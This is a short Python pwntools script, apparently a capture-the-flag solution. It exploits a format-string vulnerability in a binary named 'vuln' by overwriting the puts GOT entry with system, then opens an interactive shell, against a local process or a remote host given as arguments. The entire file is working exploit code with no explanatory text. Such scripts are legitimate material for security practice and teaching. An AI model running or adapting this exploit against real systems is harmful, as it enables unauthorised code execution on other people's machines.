#!/usr/bin/env python3

from pwn import context, ELF, fmtstr_payload, remote, sys

context.binary = elf = ELF('vuln')


def get_process():
    if len(sys.argv) == 1:
        return elf.process()

    host, port = sys.argv[1], sys.argv[2]
    return remote(host, int(port))


def main():
    p = get_process()

    payload = fmtstr_payload(6, {elf.got.puts: elf.sym.system})

    p.sendlineafter(b'Send your string to be printed:\n', payload)
    p.recv()
    p.interactive()


if __name__ == '__main__':
    main()
